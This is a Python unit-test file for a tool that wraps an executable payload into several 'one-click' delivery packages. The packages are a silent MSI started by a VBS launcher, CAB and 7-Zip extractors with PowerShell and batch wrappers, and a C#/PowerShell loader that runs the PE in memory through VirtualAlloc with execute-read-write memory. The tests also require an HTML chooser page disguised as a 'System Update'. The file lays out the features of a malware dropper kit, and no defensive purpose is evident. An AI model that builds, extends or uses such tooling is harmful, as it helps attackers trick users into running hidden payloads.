#!/usr/bin/env python3
"""
Test Suite for One-Click Extraction Variants
Validates extraction methods and variant generation
"""

import unittest
import base64
import zlib
import json
import re
from oneclick_extraction_variants import (
    OneClickExtractionVariant,
    ExtractionMethod,
    VariantDeliveryPackage
)


class TestExtractionMethods(unittest.TestCase):
    """Test each extraction method"""

    @classmethod
    def setUpClass(cls):
        """Create sample payload for testing"""
        cls.sample_payload = (
            b'MZ\x90\x00' +  # PE signature
            b'\x00' * 100 +  # Header
            b'PAYLOAD_TEST_DATA' * 10  # Test data
        )

    def test_msi_variant_generation(self):
        """Test MSI variant generation"""
        variant = OneClickExtractionVariant.generate_msi_variant(
            self.sample_payload,
            product_name="Test Product",
            version="1.0.0"
        )

        # Validate variant structure
        self.assertIn("method", variant)
        self.assertEqual(variant["method"], ExtractionMethod.MSI_NATIVE.value)
        self.assertIn("wix_source", variant)
        self.assertIn("vbs_launcher", variant)
        self.assertIn("compressed_payload", variant)

        # Validate WiX structure
        self.assertIn("<?xml", variant["wix_source"])
        self.assertIn("Wix", variant["wix_source"])
        self.assertIn("Product", variant["wix_source"])

        # Validate VBS launcher
        self.assertIn("WScript", variant["vbs_launcher"])
        self.assertIn("msiexec", variant["vbs_launcher"])

        # Validate payload compression
        try:
            decoded = base64.b64decode(variant["compressed_payload"])
            decompressed = zlib.decompress(decoded)
            self.assertEqual(decompressed, self.sample_payload)
        except Exception as e:
            self.fail(f"Payload decompression failed: {e}")

    def test_cab_variant_generation(self):
        """Test CAB variant generation"""
        variant = OneClickExtractionVariant.generate_cab_variant(
            self.sample_payload,
            cabinet_name="test_cabinet"
        )

        # Validate variant structure
        self.assertIn("method", variant)
        self.assertEqual(variant["method"], ExtractionMethod.CAB_EXTRACT.value)
        self.assertIn("powershell_extractor", variant)
        self.assertIn("batch_wrapper", variant)
        self.assertIn("vbs_wrapper", variant)

        # Validate PowerShell script
        self.assertIn("powershell", variant["powershell_extractor"])
        self.assertIn("expand.exe", variant["powershell_extractor"])

        # Validate batch wrapper
        self.assertIn("@echo off", variant["batch_wrapper"])
        self.assertIn("powershell", variant["batch_wrapper"])

    def test_sevenzip_variant_generation(self):
        """Test 7-Zip variant generation"""
        variant = OneClickExtractionVariant.generate_sevenzip_variant(
            self.sample_payload,
            archive_name="test_archive"
        )

        # Validate variant structure
        self.assertIn("method", variant)
        self.assertEqual(variant["method"], ExtractionMethod.SEVENZIP.value)
        self.assertIn("python_extractor", variant)
        self.assertIn("powershell_extractor", variant)

        # Validate Python extractor
        self.assertIn("import", variant["python_extractor"])
        self.assertIn("zlib.decompress", variant["python_extractor"])

        # Validate PowerShell extractor with fallback
        self.assertIn("7-Zip", variant["powershell_extractor"])
        self.assertIn("WinRAR", variant["powershell_extractor"])

    def test_embedded_pe_variant_generation(self):
        """Test Embedded PE variant generation"""
        variant = OneClickExtractionVariant.generate_embedded_pe_variant(
            self.sample_payload,
            pe_name="test_service"
        )

        # Validate variant structure
        self.assertIn("method", variant)
        self.assertEqual(variant["method"], ExtractionMethod.EMBEDDED_PE.value)
        self.assertIn("csharp_loader", variant)
        self.assertIn("powershell_loader", variant)

        # Validate C# loader
        self.assertIn("using System", variant["csharp_loader"])
        self.assertIn("VirtualAlloc", variant["csharp_loader"])

        # Validate PowerShell loader
        self.assertIn("powershell", variant["powershell_loader"])
        self.assertIn("IntPtr", variant["powershell_loader"])

    def test_payload_compression_integrity(self):
        """Test payload compression/decompression integrity"""
        variant = OneClickExtractionVariant.generate_msi_variant(
            self.sample_payload
        )

        # Decompress and verify
        compressed = base64.b64decode(variant["compressed_payload"])
        decompressed = zlib.decompress(compressed)

        self.assertEqual(
            decompressed,
            self.sample_payload,
            "Decompressed payload doesn't match original"
        )

    def test_variant_installation_scripts(self):
        """Test that installation scripts are properly configured"""
        variants_dict = OneClickExtractionVariant.generate_all_variants(
            self.sample_payload
        )

        for method, variant in variants_dict.items():
            self.assertIn(
                "installation_script",
                variant,
                f"{method} missing installation_script"
            )
            self.assertIsNotNone(
                variant["installation_script"],
                f"{method} installation_script is None"
            )


class TestVariantDelivery(unittest.TestCase):
    """Test variant delivery and packaging"""

    @classmethod
    def setUpClass(cls):
        """Create sample payload and variants"""
        cls.sample_payload = b'MZ\x90\x00' + b'\x00' * 100
        cls.variants = OneClickExtractionVariant.generate_all_variants(
            cls.sample_payload
        )

    def test_variant_selector_generation(self):
        """Test variant selector interface generation"""
        package = VariantDeliveryPackage()
        selectors = package.create_variant_selector(self.variants)

        self.assertIn("html_selector", selectors)
        self.assertIn("batch_selector", selectors)

        # Validate HTML selector
        self.assertIn("<!DOCTYPE html>", selectors["html_selector"])
        self.assertIn("System Update", selectors["html_selector"])

        # Validate batch selector
        self.assertIn("@echo off", selectors["batch_selector"])
        self.assertIn("choice", selectors["batch_selector"])

    def test_package_manifest_generation(self):
        """Test package manifest generation"""
        package = VariantDeliveryPackage()
        manifest_json = package.package_all_variants(self.variants)

        # Parse JSON
        manifest = json.loads(manifest_json)

        # Validate structure
        self.assertIn("package_name", manifest)
        self.assertIn("extraction_methods", manifest)
        self.assertIn("files", manifest)

        # Validate content
        self.assertEqual(len(manifest["extraction_methods"]), 4)
        self.assertGreater(len(manifest["files"]), 0)

    def test_manifest_contains_all_methods(self):
        """Test that manifest contains all extraction methods"""
        package = VariantDeliveryPackage()
        manifest_json = package.package_all_variants(self.variants)
        manifest = json.loads(manifest_json)

        methods = [m["id"] for m in manifest["extraction_methods"]]

        self.assertIn("msi_native", methods)
        self.assertIn("cab_extract", methods)
        self.assertIn("sevenzip", methods)
        self.assertIn("embedded_pe", methods)


class TestVariantIntegrity(unittest.TestCase):
    """Test variant integrity and consistency"""

    @classmethod
    def setUpClass(cls):
        """Create sample payload"""
        cls.sample_payload = (
            b'MZ\x90\x00' +
            b'\x00' * 100 +
            b'TEST_PAYLOAD_MARKER'
        )

    def test_all_variants_generated(self):
        """Test that all variants are generated"""
        variants = OneClickExtractionVariant.generate_all_variants(
            self.sample_payload
        )

        self.assertEqual(len(variants), 4)
        self.assertIn("msi_native", variants)
        self.assertIn("cab_extract", variants)
        self.assertIn("sevenzip", variants)
        self.assertIn("embedded_pe", variants)

    def test_variant_method_types(self):
        """Test that variant method types are correct"""
        variants = OneClickExtractionVariant.generate_all_variants(
            self.sample_payload
        )

        expected_methods = {
            "msi_native": ExtractionMethod.MSI_NATIVE.value,
            "cab_extract": ExtractionMethod.CAB_EXTRACT.value,
            "sevenzip": ExtractionMethod.SEVENZIP.value,
            "embedded_pe": ExtractionMethod.EMBEDDED_PE.value
        }

        for variant_key, expected_method in expected_methods.items():
            self.assertIn(variant_key, variants)
            self.assertEqual(
                variants[variant_key]["method"],
                expected_method,
                f"{variant_key} has incorrect method type"
            )

    def test_vbs_script_validity(self):
        """Test VBS script syntax validity"""
        variant = OneClickExtractionVariant.generate_msi_variant(
            self.sample_payload
        )

        vbs = variant["vbs_launcher"]

        # Check for common VBS keywords
        self.assertIn("On Error", vbs)
        self.assertIn("Dim", vbs)
        self.assertIn("Set", vbs)
        self.assertIn("CreateObject", vbs)

        # Check for proper structure
        self.assertIn("WScript.Quit", vbs)

    def test_powershell_script_validity(self):
        """Test PowerShell script syntax validity"""
        variant = OneClickExtractionVariant.generate_cab_variant(
            self.sample_payload
        )

        ps = variant["powershell_extractor"]

        # Check for PowerShell keywords
        self.assertIn("$", ps)
        self.assertIn("Write-", ps)

    def test_batch_script_validity(self):
        """Test batch script syntax validity"""
        variant = OneClickExtractionVariant.generate_cab_variant(
            self.sample_payload
        )

        batch = variant["batch_wrapper"]

        # Check for batch keywords
        self.assertIn("@echo", batch)
        self.assertIn("setlocal", batch)

    def test_payload_size_consistency(self):
        """Test that payload sizes are consistent across variants"""
        variants = OneClickExtractionVariant.generate_all_variants(
            self.sample_payload
        )

        # All should have same compressed payload (assuming same input)
        payloads = []
        for variant in variants.values():
            if "compressed_payload" in variant:
                payloads.append(variant["compressed_payload"])

        # They should all decode to the same data
        for payload_str in payloads:
            decoded = base64.b64decode(payload_str)
            decompressed = zlib.decompress(decoded)
            self.assertEqual(decompressed, self.sample_payload)


class TestVariantFeatures(unittest.TestCase):
    """Test specific features of variants"""

    @classmethod
    def setUpClass(cls):
        """Create sample payload"""
        cls.sample_payload = b'MZ\x90\x00' + b'\x00' * 100

    def test_msi_silent_installation(self):
        """Test MSI includes silent installation flags"""
        variant = OneClickExtractionVariant.generate_msi_variant(
            self.sample_payload
        )

        vbs = variant["vbs_launcher"]
        # Should include /qn (quiet, no UI)
        self.assertIn("msiexec", vbs)
        self.assertIn("/qn", vbs)
        self.assertIn("norestart", vbs)

    def test_cab_fallback_methods(self):
        """Test CAB variant includes fallback extraction methods"""
        variant = OneClickExtractionVariant.generate_cab_variant(
            self.sample_payload
        )

        ps = variant["powershell_extractor"]
        # Should check for multiple tools
        self.assertIn("expand.exe", ps)

    def test_sevenzip_tool_detection(self):
        """Test 7-Zip variant includes tool detection"""
        variant = OneClickExtractionVariant.generate_sevenzip_variant(
            self.sample_payload
        )

        ps = variant["powershell_extractor"]
        # Should detect installed tools
        self.assertIn("7-Zip", ps)
        self.assertIn("WinRAR", ps)

    def test_embedded_pe_memory_protection(self):
        """Test Embedded PE includes memory protection flags"""
        variant = OneClickExtractionVariant.generate_embedded_pe_variant(
            self.sample_payload
        )

        ps = variant["powershell_loader"]
        # Should use proper memory protection
        self.assertIn("0x40", ps)  # PAGE_EXECUTE_READWRITE


class TestErrorHandling(unittest.TestCase):
    """Test error handling in variant generation"""

    def test_empty_payload_handling(self):
        """Test handling of empty payload"""
        empty_payload = b""

        # Should not raise exception
        try:
            variant = OneClickExtractionVariant.generate_msi_variant(
                empty_payload
            )
            self.assertIsNotNone(variant)
        except Exception as e:
            self.fail(f"Empty payload handling failed: {e}")

    def test_large_payload_compression(self):
        """Test compression of large payload"""
        large_payload = b"X" * (10 * 1024 * 1024)  # 10 MB

        try:
            variant = OneClickExtractionVariant.generate_msi_variant(
                large_payload
            )
            # Verify compression works
            self.assertIn("compressed_payload", variant)
            compressed = base64.b64decode(variant["compressed_payload"])
            # Compressed should be smaller than original
            self.assertLess(len(compressed), len(large_payload))
        except Exception as e:
            self.fail(f"Large payload compression failed: {e}")

    def test_special_characters_in_payload(self):
        """Test handling of special characters in payload"""
        special_payload = bytes(range(256)) * 10  # All byte values

        try:
            variant = OneClickExtractionVariant.generate_msi_variant(
                special_payload
            )
            self.assertIsNotNone(variant)

            # Verify decompression
            compressed = base64.b64decode(variant["compressed_payload"])
            decompressed = zlib.decompress(compressed)
            self.assertEqual(decompressed, special_payload)
        except Exception as e:
            self.fail(f"Special character handling failed: {e}")


def run_test_suite():
    """Run all tests"""
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()

    # Add all test cases
    suite.addTests(loader.loadTestsFromTestCase(TestExtractionMethods))
    suite.addTests(loader.loadTestsFromTestCase(TestVariantDelivery))
    suite.addTests(loader.loadTestsFromTestCase(TestVariantIntegrity))
    suite.addTests(loader.loadTestsFromTestCase(TestVariantFeatures))
    suite.addTests(loader.loadTestsFromTestCase(TestErrorHandling))

    runner = unittest.TextTestRunner(verbosity=2)
    return runner.run(suite)


if __name__ == "__main__":
    result = run_test_suite()

    # Summary
    print("\n" + "=" * 70)
    print("TEST SUITE SUMMARY")
    print("=" * 70)
    print(f"Tests Run: {result.testsRun}")
    print(f"Successes: {result.testsRun - len(result.failures) - len(result.errors)}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print("=" * 70)
